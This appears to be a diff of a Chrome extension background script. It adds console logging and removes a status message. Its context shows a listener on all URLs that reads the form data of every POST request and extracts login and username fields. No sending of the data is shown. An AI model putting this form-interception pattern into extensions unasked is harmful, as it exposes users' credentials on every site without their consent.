@@ -5,6 +5,7 @@ function getPageDetails(callback) {
      // When a message is received from the content script
      chrome.runtime.onMessage.addListener(function(message) {
         // Call the callback function
+        console.log(message)
         callback(message);
     });
 }
@@ -13,6 +14,7 @@ chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
       if(details.method == "POST") {
         formData = details.requestBody.formData;
+        console.log(formData)
         login = details.requestBody.formData.login
         user = details.requestBody.formData.user
         username = details.requestBody.formData.username
@@ -30,11 +32,3 @@ chrome.webRequest.onBeforeRequest.addListener(
     {urls: ["<all_urls>"]},
     ["requestBody"]
   );
-
-  chrome.runtime.sendMessage({
-    msg: "something_completed", 
-    data: {
-        subject: "Loading",
-        content: "Just completed!"
-    }
-});
